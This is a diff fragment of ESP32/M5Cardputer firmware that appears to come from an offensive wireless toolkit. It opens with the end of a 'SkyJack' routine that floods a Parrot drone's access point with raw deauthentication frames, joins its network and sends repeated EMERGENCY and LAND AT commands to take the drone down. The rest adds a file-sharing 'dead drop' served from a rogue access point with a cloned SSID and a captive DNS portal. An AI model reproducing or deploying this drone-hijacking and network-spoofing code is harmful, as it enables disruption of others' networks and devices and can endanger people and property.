+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_mode(WIFI_MODE_NULL);
+  esp_wifi_start();
+  esp_wifi_set_channel(parrotChannel, WIFI_SECOND_CHAN_NONE);
+  delay(100);
+
+  uint8_t deauthPacket[26];
+  buildDeauthPacket(deauthPacket, parrotBSSID);
+
+  for (int i = 0; i < 30; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(10);
+  }
+
+  drawSkyjackStatus("Deauth sent.");
+  delay(1000);
+
+  // Étape 3 : Connexion au drone
+  drawSkyjackStatus("Connecting...");
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(parrotSSID.c_str());
+
+  unsigned long startAttemptTime = millis();
+  bool connected = false;
+
+  while (millis() - startAttemptTime < 6000) {
+    if (WiFi.status() == WL_CONNECTED) {
+      connected = true;
+      break;
+    }
+    delay(500);
+  }
+
+  if (!connected) {
+    drawSkyjackStatus("Connection failed.");
+    waitAndReturnToMenu("Fail connect.");
+    return;
+  }
+
+  drawSkyjackStatus("Connected!");
+  drawSkyjackStatus("Sending EMERGENCY + LAND...");
+
+  // Étape 4 : EMERGENCY + LAND
+  WiFiClient client;
+  if (client.connect("192.168.1.1", 5556)) {
+    for (int i = 0; i < 5; i++) {
+      sendATCommandToDrone(client, "290717952"); // Emergency
+      delay(50);
+      sendATCommandToDrone(client, "290717696"); // Land
+      delay(50);
+    }
+    client.stop();
+    drawSkyjackStatus("Commands sent.");
+  } else {
+    drawSkyjackStatus("Drone not responding.");
+  }
+
+  delay(1000);
+  WiFi.disconnect(true);
+  waitAndReturnToMenu("SkyJack done.");
+}
+
+
+
+
+
+
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+
+volatile int ddActiveTransfers = 0;  // number of in-flight uploads/downloads
+
+// =================== Dead Drop Dashboard Globals =====================
+const char* DD_BASE = "/evil/deaddrop";
+bool ddActive = false;
+
+// Counters
+volatile unsigned long ddUploadsCount   = 0;
+volatile unsigned long ddDownloadsCount = 0;
+volatile unsigned long ddNotesCount     = 0;
+volatile unsigned long ddBytesIn        = 0;
+volatile unsigned long ddBytesOut       = 0;
+
+// History buffers
+const int DD_HIST_LEN = 64;
+uint8_t ddClientsHist[DD_HIST_LEN];
+uint8_t ddInHist[DD_HIST_LEN];   // upload history
+uint8_t ddOutHist[DD_HIST_LEN];  // download history
+int ddHistHead = 0;
+
+// UI cache
+int uiLastClients = -1;
+int uiLastFiles   = -1;
+unsigned long uiLastUp   = (unsigned long) - 1;
+unsigned long uiLastDown = (unsigned long) - 1;
+unsigned long uiLastNotes = (unsigned long) - 1;
+unsigned long ddLastBytesIn  = 0;
+unsigned long ddLastBytesOut = 0;
+unsigned long ddLastTickMs   = 0;
+
+// Async server dedicated to DeadDrop
+AsyncWebServer ddServer(80);
+
+// UI task
+TaskHandle_t ddUiTaskHandle = NULL;
+
+// =================== Helpers =====================
+String ddUrlEncode(const String& in) {
+  String o; o.reserve(in.length() * 3);
+  for (size_t i = 0; i < in.length(); i++) {
+    char c = in[i];
+    bool safe = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~';
+    if (safe) o += c;
+    else {
+      char buf[4];
+      snprintf(buf, sizeof(buf), "%%%02X", (unsigned char)c);
+      o += buf;
+    }
+  }
+  return o;
+}
+
+String ddHtmlEscape(const String& in) {
+  String o; o.reserve(in.length() + 8);
+  for (size_t i = 0; i < in.length(); i++) {
+    char c = in[i];
+    if (c == '&') o += "&amp;";
+    else if (c == '<') o += "&lt;";
+    else if (c == '>') o += "&gt;";
+    else if (c == '"') o += "&quot;";
+    else o += c;
+  }
+  return o;
+}
+
+String ddMimeFromExt(const String& name) {
+  int dot = name.lastIndexOf('.');
+  String ext = (dot >= 0) ? name.substring(dot + 1) : "";
+  ext.toLowerCase();
+  if (ext == "txt") return "text/plain";
+  if (ext == "htm" || ext == "html") return "text/html";
+  if (ext == "json") return "application/json";
+  if (ext == "jpg" || ext == "jpeg") return "image/jpeg";
+  if (ext == "png") return "image/png";
+  if (ext == "gif") return "image/gif";
+  if (ext == "pdf") return "application/pdf";
+  if (ext == "csv") return "text/csv";
+  if (ext == "mp3") return "audio/mpeg";
+  if (ext == "mp4") return "video/mp4";
+  if (ext == "zip") return "application/zip";
+  return "application/octet-stream";
+}
+
+String ddSafeName(const String& in) {
+  String s = in;
+  s.replace("\\", "_"); s.replace("/", "_"); s.replace("..", "_");
+  s.replace("%", "_"); s.replace(":", "_");
+  s.replace("\"", "_"); s.replace("'", "_");
+  s.trim();
+  if (s.length() == 0) s = "drop.bin";
+  return s;
+}
+
+int ddCountFiles() {
+  int n = 0;
+  File dir = SD.open(DD_BASE);
+  if (!dir) return 0;
+  while (true) {
+    File f = dir.openNextFile();
+    if (!f) break;
+    if (!f.isDirectory()) n++;
+    f.close();
+  }
+  dir.close();
+  return n;
+}
+
+// =================== Dashboard Drawing =====================
+const int T_W = 72, T_H = 28;
+const int T_CL_X = 6,   T_CL_Y = 48;
+const int T_UP_X = 84,  T_UP_Y = 48;
+const int T_DW_X = 162, T_DW_Y = 48;
+const int T_FL_X = 6,   T_FL_Y = 78, T_FL_H = 24;
+const int T_IO_X = 84,  T_IO_Y = 78, T_IO_W = 150, T_IO_H = 24;
+
+void ddDrawHeader(const char* title) {
+  M5.Display.fillRect(0, 0, 240, 18, TFT_DARKCYAN);
+  M5.Display.drawFastHLine(0, 18, 240, TFT_BLACK);
+  M5.Display.setTextColor(TFT_BLACK, TFT_DARKCYAN);
+  M5.Display.setTextSize(1);
+  M5.Display.setCursor(6, 4); M5.Display.print(title);
+}
+
+void ddDrawTextLine(int x, int y, const char* label, const char* value) {
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(x, y); M5.Display.print(label);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(x + 56, y); M5.Display.print(value);
+}
+
+void ddDrawTileFrame(int x, int y, int w, int h, const char* caption) {
+  M5.Display.drawRoundRect(x, y, w, h, 5, TFT_DARKGREY);
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(x + 6, y + 4); M5.Display.print(caption);
+  int clearY = y + 13;
+  M5.Display.fillRect(x + 1, clearY, w - 2, h - (clearY - y) - 2, TFT_BLACK);
+}
+
+void ddDrawSparkline(int x, int y, int w, int h,
+                     uint8_t* hist, int len, int head,
+                     uint16_t color, bool clear = true) {
+  if (clear) {
+    M5.Display.fillRect(x, y, w, h, TFT_BLACK);
+    for (int gx = 0; gx < w; gx += 16) M5.Display.drawFastVLine(x + gx, y, h, TFT_DARKGREY);
+    for (int gy = 0; gy < h; gy += 10) M5.Display.drawFastHLine(x, y + gy, w, TFT_DARKGREY);
+  }
+
+  if (len < 2) return;
+  int prevX = x;
+  int idx0  = head % len;
+  int v0    = hist[idx0];
+  int prevY = y + h - 1 - (v0 * (h - 1)) / 100;
+
+  for (int i = 1; i < len; ++i) {
+    int idx = (head + i) % len;
+    int v   = hist[idx];
+    int px  = x + (i * (w - 1)) / (len - 1);
+    int py  = y + h - 1 - (v * (h - 1)) / 100;
+    M5.Display.drawLine(prevX, prevY, px, py, color);
+    prevX = px; prevY = py;
+  }
+}
+
+
+void ddDashboardInit(const char* ssid, const String& ip) {
+  M5.Display.fillScreen(TFT_BLACK);
+  ddDrawHeader("WiFi Dead Drop");
+
+  ddDrawTextLine(6, 22, "SSID", ssid);
+  ddDrawTextLine(6, 34, "IP  ", ip.c_str());
+
+  ddDrawTileFrame(6,   48, 72, 28, "Clients");
+  ddDrawTileFrame(84,  48, 72, 28, "Uploads");
+  ddDrawTileFrame(162, 48, 72, 28, "Downloads");
+  ddDrawTileFrame(6,   78, 72, 24, "Files");
+  ddDrawTileFrame(84,  78, 150,24, "IO KB/s (up/down)");
+
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(6,   106); M5.Display.print("Clients");
+  M5.Display.setCursor(126, 106); M5.Display.print("Throughput");
+
+  // Clients graph
+  ddDrawSparkline(6,   115, 108, 18, ddClientsHist, DD_HIST_LEN, ddHistHead, TFT_GREEN, true);
+  // Throughput: overlay two curves (cyan = upload, yellow = download)
+  ddDrawSparkline(126, 115, 108, 18, ddInHist,  DD_HIST_LEN, ddHistHead, TFT_CYAN,   true);
+  ddDrawSparkline(126, 115, 108, 18, ddOutHist, DD_HIST_LEN, ddHistHead, TFT_YELLOW, false);
+}
+
+
+inline void ddDrawValueInTile(int x, int y, int w, int h, const char* txt) {
+  int clearY = y + 13;
+  M5.Display.fillRect(x + 1, clearY, w - 2, h - (clearY - y) - 2, TFT_BLACK);
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(x + 6, y + h - 10); M5.Display.print(txt);
+}
+
+void ddUpdateTileClients(int v) {
+  if (v == uiLastClients) return;
+  uiLastClients = v;
+  char buf[8];
+  snprintf(buf, sizeof(buf), "%d", v);
+  ddDrawValueInTile(T_CL_X, T_CL_Y, T_W, T_H, buf);
+}
+void ddUpdateTileUploads(unsigned long v) {
+  if (v == uiLastUp) return;
+  uiLastUp = v;
+  char buf[12];
+  snprintf(buf, sizeof(buf), "%lu", v);
+  ddDrawValueInTile(T_UP_X, T_UP_Y, T_W, T_H, buf);
+}
+void ddUpdateTileDownloads(unsigned long v) {
+  if (v == uiLastDown) return;
+  uiLastDown = v;
+  char buf[12];
+  snprintf(buf, sizeof(buf), "%lu", v);
+  ddDrawValueInTile(T_DW_X, T_DW_Y, T_W, T_H, buf);
+}
+void ddUpdateTileFiles(int v) {
+  if (v == uiLastFiles) return;
+  uiLastFiles = v;
+  char buf[12];
+  snprintf(buf, sizeof(buf), "%d", v);
+  ddDrawValueInTile(T_FL_X, T_FL_Y, T_W, T_FL_H, buf);
+}
+void ddUpdateTileIO(unsigned long inKBs, unsigned long outKBs) {
+  char buf[24];
+  snprintf(buf, sizeof(buf), "%lu / %lu", inKBs, outKBs);
+  ddDrawValueInTile(T_IO_X, T_IO_Y, T_IO_W, T_IO_H, buf);
+}
+
+void ddPushHistory(uint8_t clientsScaled, uint8_t inScaled, uint8_t outScaled) {
+  ddClientsHist[ddHistHead] = clientsScaled;
+  ddInHist[ddHistHead]      = inScaled;
+  ddOutHist[ddHistHead]     = outScaled;
+  ddHistHead = (ddHistHead + 1) % DD_HIST_LEN;
+
+  // Redraw graphs
+  ddDrawSparkline(6,   115, 108, 18, ddClientsHist, DD_HIST_LEN, ddHistHead, TFT_GREEN, true);
+  ddDrawSparkline(126, 115, 108, 18, ddInHist,      DD_HIST_LEN, ddHistHead, TFT_CYAN,   true);
+  ddDrawSparkline(126, 115, 108, 18, ddOutHist,     DD_HIST_LEN, ddHistHead, TFT_YELLOW, false);
+}
+
+
+
+void ddUiTask(void* pv) {
+  memset(ddClientsHist, 0, sizeof(ddClientsHist));
+  memset(ddInHist,      0, sizeof(ddInHist));
+  memset(ddOutHist,     0, sizeof(ddOutHist));
+  ddHistHead = 0;
+
+  ddLastBytesIn  = ddBytesIn;
+  ddLastBytesOut = ddBytesOut;
+  ddLastTickMs   = millis();
+
+  while (ddActive) {
+    dnsServer.processNextRequest();
+    unsigned long now = millis();
+    if (now - ddLastTickMs >= 400) {
+      unsigned long tickMs = now - ddLastTickMs;
+      ddLastTickMs = now;
+
+      int clients = WiFi.softAPgetStationNum();
+      int files   = ddCountFiles();
+
+      unsigned long inDelta  = ddBytesIn  - ddLastBytesIn;
+      unsigned long outDelta = ddBytesOut - ddLastBytesOut;
+      ddLastBytesIn  = ddBytesIn;
+      ddLastBytesOut = ddBytesOut;
+
+      unsigned long inKBs  = (inDelta  * 1000UL) / (tickMs * 1024UL);
+      unsigned long outKBs = (outDelta * 1000UL) / (tickMs * 1024UL);
+
+      ddUpdateTileClients(clients);
+      ddUpdateTileUploads(ddUploadsCount);
+      ddUpdateTileDownloads(ddDownloadsCount);
+      ddUpdateTileFiles(files);
+      ddUpdateTileIO(inKBs, outKBs);
+
+      uint8_t clientsScaled = (clients > 10) ? 100 : (uint8_t)(clients * 10);
+      if (inKBs  > 200) inKBs  = 200;
+      if (outKBs > 200) outKBs = 200;
+      uint8_t inScaled  = (uint8_t)((inKBs  * 100UL) / 200UL);
+      uint8_t outScaled = (uint8_t)((outKBs * 100UL) / 200UL);
+
+      ddPushHistory(clientsScaled, inScaled, outScaled);
+    }
+    vTaskDelay(pdMS_TO_TICKS(25));
+  }
+  vTaskDelete(NULL);
+}
+
+
+
+
+// =================== HTTP Handlers =====================
+void setupDeadDropRoutes() {
+  // Landing page
+  ddServer.on("/", HTTP_GET, [](AsyncWebServerRequest * req) {
+    String html;
+    html += "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
+    html += "<title>WiFi Dead Drop</title>";
+    html += "<style>";
+    html += "body{background:#111;color:#ddd;font-family:Consolas,monospace;text-align:center;margin:0;padding:0;}";
+    html += ".container{max-width:500px;margin:40px auto;padding:20px;}";
+    html += "h2{color:#0ff;margin-bottom:10px;text-shadow:0 0 6px #0ff;}";
+    html += "h3{color:#0ff;margin-top:30px;}";
+    html += "p{font-size:14px;line-height:1.5;color:#aaa;}";
+    html += ".block{width:100%;margin:8px 0;box-sizing:border-box;}";
+    html += "input,textarea,button{width:100%;padding:10px;border:1px solid #0ff;background:#111;color:#0ff;font-family:Consolas,monospace;font-size:14px;display:block;}";
+    html += "textarea{resize:vertical;}";
+    html += "button{cursor:pointer;transition:all 0.2s;}button:hover{background:#0ff;color:#111;}";
+    html += "progress{width:100%;height:14px;margin:8px 0;}";
+    html += "#status{font-size:13px;margin-top:6px;color:#aaa;}";
+    html += "a{color:#0ff;text-decoration:none;}a:hover{text-decoration:underline;}";
+    html += "@media(max-width:600px){.container{max-width:100%;margin:0;padding:15px;}}";
+    html += "</style></head><body>";
+  
+    html += "<div class='container'>";
+    html += "<h2>WiFi Dead Drop</h2>";
+    html += "<p>Welcome to the underground dead drop. Share files or leave notes.</p>";
+  
+    // Upload section
+    html += "<h3>Upload a File</h3>";
+    html += "<input id='f' class='block' type='file'>";
+    html += "<button class='block' onclick='up()'>Upload</button>";
+    html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
+    html += "<div id='status'></div>";
+  
+    // Note section
+    html += "<h3>Leave a Note</h3>";
+    html += "<form method='post' action='/dd-note'>";
+    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='Drop your message here...'></textarea>";
+    html += "<button class='block' type='submit'>Publish</button></form>";
+  
+    // Link to deposits
+    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; View Deposits</a></p>";
+  
+    // Footer
+    html += "<hr style='border:0;border-top:1px solid #333;margin:20px 0'>";
+    html += "<small>Connected to <span style='color:#0ff'>" + WiFi.softAPIP().toString() + "</span></small>";
+  
+    // Script with percent + speed + transferred
+    html += "<script>";
+    html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
+    html += "function up(){";
+    html += " var f=document.getElementById('f').files[0];";
+    html += " if(!f){alert('Select a file');return;}";
+    html += " var p=document.getElementById('prog');";
+    html += " var s=document.getElementById('status');";
+    html += " p.style.display='block';p.value=0;s.textContent='Starting upload...';";
+    html += " var start=Date.now();";
+    html += " var xhr=new XMLHttpRequest();xhr.open('POST','/dd-upload',true);";
+    html += " xhr.upload.onprogress=function(e){";
+    html += "   if(e.lengthComputable){";
+    html += "     var percent=Math.floor((e.loaded/e.total)*100);";
+    html += "     var elapsed=(Date.now()-start)/1000;";
+    html += "     var speed=(e.loaded/1024/elapsed).toFixed(1);";
+    html += "     p.value=percent;";
+    html += "     s.textContent='Uploading '+percent+'% ('+human(e.loaded)+' / '+human(e.total)+', '+speed+' KB/s)';";
+    html += "   }";
+    html += " };";
+    html += " xhr.onload=function(){s.textContent='Upload complete';window.location='/dd-list';};";
+    html += " xhr.onerror=function(){s.textContent='Upload failed';};";
+    html += " var form=new FormData();form.append('data',f,f.name);xhr.send(form);";
+    html += "}";
+    html += "</script>";
+  
+    html += "</div></body></html>";
+    req->send(200, "text/html", html);
+  });
+
+
+
+
+  ddServer.on("/dd-list", HTTP_GET, [](AsyncWebServerRequest * req) {
+    File dir = SD.open(DD_BASE);
+    if (!dir || !dir.isDirectory()) {
+      req->send(500, "text/plain", "SD not ready");
+      return;
+    }
+    String html = "<!doctype html><html><head><meta charset='utf-8'>";
+    html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
+    html += "<title>Deposits</title><style>";
+    html += "body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;margin:20px;}";
+    html += "h3{color:#ff00aa;text-shadow:0 0 8px #ff00aa;}";
+    html += "a{color:#00b7ff;text-decoration:none;}a:hover{text-shadow:0 0 6px #00b7ff;}";
+    html += "table{width:100%;border-collapse:collapse;margin-top:10px;}";
+    html += "th,td{text-align:left;padding:6px;border-bottom:1px solid #222;}";
+    html += "th{color:#0ff;font-size:14px;} td{font-size:13px;}";
+    html += "</style></head><body>";
+    html += "<h3>📂 Uploaded Files</h3>";
+    html += "<table><tr><th>Name</th><th>Size</th></tr>";
+    while (true) {
+      File f = dir.openNextFile();
+      if (!f) break;
+      if (!f.isDirectory()) {
+        String base = f.name(); int p = base.lastIndexOf('/'); if (p >= 0) base = base.substring(p + 1);
+        unsigned long sz = f.size();
+        String sizeStr;
+        if (sz > 1000000000) sizeStr = String((float)sz / 1000000000.0, 2) + " GB";
+        else if (sz > 1000000) sizeStr = String((float)sz / 1000000.0, 2) + " MB";
+        else if (sz > 1000) sizeStr = String((float)sz / 1000.0, 1) + " KB";
+        else sizeStr = String(sz) + " B";
+        html += "<tr><td><a href='/dd-get?f=" + ddUrlEncode(base) + "'>" + ddHtmlEscape(base) + "</a></td><td>" + sizeStr + "</td></tr>";
+      }
+      f.close();
+    }
+    dir.close();
+    html += "</table><p><a href='/'>⬅ Back</a></p></body></html>";
+    req->send(200, "text/html", html);
+  });
+
+
+  // ---- Download (counts bytes per chunk + safe shutdown) ----
+  ddServer.on("/dd-get", HTTP_GET, [](AsyncWebServerRequest *req){
+    if (!req->hasParam("f")) { req->send(400, "text/plain", "Missing f"); return; }
+  
+    String f = ddSafeName(req->getParam("f")->value());
+    String path = String(DD_BASE) + "/" + f;
+  
+    if (!SD.exists(path)) { req->send(404, "text/plain", "Not found"); return; }
+  
+    File file = SD.open(path, FILE_READ);
+    if (!file) { req->send(500, "text/plain", "Failed to open file"); return; }
+  
+    const size_t fileSize = file.size();
+    const String mime     = ddMimeFromExt(f);
+  
+    ddActiveTransfers++;  // <--- mark running transfer
+  
+    AsyncWebServerResponse *resp = req->beginResponse(
+      mime, fileSize,
+      [file](uint8_t *buffer, size_t maxLen, size_t index) mutable -> size_t {
+        // If UI asked to exit, stop cleanly
+        if (!ddActive) {
+          if (file) file.close();
+          ddActiveTransfers--;
+          return 0;
+        }
+  
+        if (!file.available()) {
+          if (file) file.close();
+          ddDownloadsCount++;
+          ddActiveTransfers--;
+          return 0; // done
+        }
+  
+        size_t n = file.read(buffer, maxLen);
+        ddBytesOut += n;  // live accounting for throughput
+        return n;
+      }
+    );
+  
+    resp->addHeader("Content-Disposition",
+                    "attachment; filename=\"" + f + "\"; filename*=UTF-8''" + ddUrlEncode(f));
+    req->send(resp);
+  });
+
+  // Store notes
+  ddServer.on("/dd-note", HTTP_POST, [](AsyncWebServerRequest * req) {
+    if (req->hasParam("msg", true)) {
+      String msg = req->getParam("msg", true)->value(); msg.trim();
+      if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);
+      if (msg.length() > 0) {
+        File notes = SD.open(String(DD_BASE) + "/notes.txt", FILE_APPEND);
+        if (notes) {
+          notes.println(msg);
+          notes.close();
+          ddNotesCount++;
+        }
+      }
+    }
+    req->redirect("/dd-list");
+  });
+
+  ddServer.on("/dd-upload", HTTP_POST,
+    [](AsyncWebServerRequest * req) {
+      req->send(200, "text/plain", "OK");
+    },
+    [](AsyncWebServerRequest * req, String filename, size_t index, uint8_t *data, size_t len, bool final) {
+      // If we’re shutting down, ignore new chunks
+      if (!ddActive) return;
+  
+      String safe = ddSafeName(filename);
+      String path = String(DD_BASE) + "/" + safe;
+  
+      if (index == 0) {
+        if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);
+        req->_tempFile = SD.open(path, FILE_WRITE);
+        ddActiveTransfers++;  // <--- start of a new upload
+        Serial.printf("[DD] Upload start: %s\n", path.c_str());
+      }
+  
+      if (req->_tempFile) {
+        req->_tempFile.write(data, len);
+        ddBytesIn += len;
+      }
+  
+      if (final) {
+        if (req->_tempFile) {
+          req->_tempFile.close();
+          ddUploadsCount++;
+        }
+        ddActiveTransfers--;  // <--- upload finished
+        Serial.printf("[DD] Upload done: %s\n", path.c_str());
+      }
+    }
+  );
+
+  // Status JSON
+  ddServer.on("/dd-status", HTTP_GET, [](AsyncWebServerRequest * req) {
+    String json = "{\"clients\":" + String(WiFi.softAPgetStationNum()) +
+                  ",\"uploads\":" + String(ddUploadsCount) +
+                  ",\"downloads\":" + String(ddDownloadsCount) +
+                  ",\"notes\":" + String(ddNotesCount) +
+                  ",\"bytesIn\":" + String(ddBytesIn) +
+                  ",\"bytesOut\":" + String(ddBytesOut) + "}";
+    req->send(200, "application/json", json);
+  });
+
+  // ---- Captive Portal helpers (must be BEFORE onNotFound) ----
+
+  ddServer.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r){r->send(200, "text/plain", "OK");});
+  ddServer.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *r){r->send(200, "text/plain", "OK");});
+  ddServer.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r){r->send(200, "text/html", "<html><head><title>Success</title></head><body>Success</body></html>");});
+  ddServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200, "text/plain", "Microsoft NCSI");});
+  ddServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r){r->send(200, "text/plain", "Microsoft Connect Test");});
+  ddServer.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *r){r->send(204);});
+
+  ddServer.onNotFound([](AsyncWebServerRequest *r){
+    r->redirect("/");
+  });
+
+}
+void WifiDeadDrop() {
+  // Stop the main (blocking) portal if it was running elsewhere.
+  dnsServer.stop();
+  server.stop();
+
+  isOperationInProgress = true;
+
+  if (!SD.exists(DD_BASE)) SD.mkdir(DD_BASE);
+
+  char ssidBuf[64];
+  strncpy(ssidBuf, clonedSSID.c_str(), sizeof(ssidBuf) - 1);
+  ssidBuf[sizeof(ssidBuf) - 1] = '\0';
+
+  // Bring up AP for DeadDrop
+  WiFi.mode(WIFI_MODE_AP);
+  WiFi.softAP(ssidBuf, nullptr, 1, false, 10);
+
+  ipAP  = WiFi.softAPIP();
+  ipSTA = WiFi.localIP();
+
+  esp_wifi_set_ps(WIFI_PS_NONE);
+
+  // Captive DNS for DeadDrop
+  dnsServer.start(53, "*", ipAP);
+
+  // Async HTTP routes
+  setupDeadDropRoutes();
+  ddServer.begin();
+
+  // UI
+  ddDashboardInit(ssidBuf, ipAP.toString());
+
+  ddActive = true;
+
+  // Start UI task pinned to core 1 (GFX friendly)
+  xTaskCreatePinnedToCore(ddUiTask, "ddUiTask", 4096, NULL, 1, &ddUiTaskHandle, 1);
+
+  // --------- service loop (exit on BKSP) ----------
+  while (ddActive) {
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      ddActive = false;               // signal all loops/callbacks to wind down
+      break;
+    }
+    delay(1);
+  }
+
+  // --------------- graceful shutdown ----------------
+
+  if (ddUiTaskHandle != NULL) {
+    unsigned long t0 = millis();
+    while (eTaskGetState(ddUiTaskHandle) != eDeleted && (millis() - t0) < 800UL) {
+      vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    if (eTaskGetState(ddUiTaskHandle) != eDeleted) {
+      vTaskDelete(ddUiTaskHandle);
+    }
+    ddUiTaskHandle = NULL;
+  }
+   
+  dnsServer.stop();
+
+#if defined(ESPASYNC_WEBSERVER_H) || defined(ASYNC_WEBSERVER_VERSION)
+  ddServer.end();
+#endif
+
+  unsigned long ddDrainStart = millis();
+  while (ddActiveTransfers > 0 && (millis() - ddDrainStart) < 1500UL) {
+    vTaskDelay(pdMS_TO_TICKS(10));
+  }
+
+
+  ddServer.reset();
+
+
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_MODE_APSTA);  
+
+  waitAndReturnToMenu("Dead Drop stopped");
 }
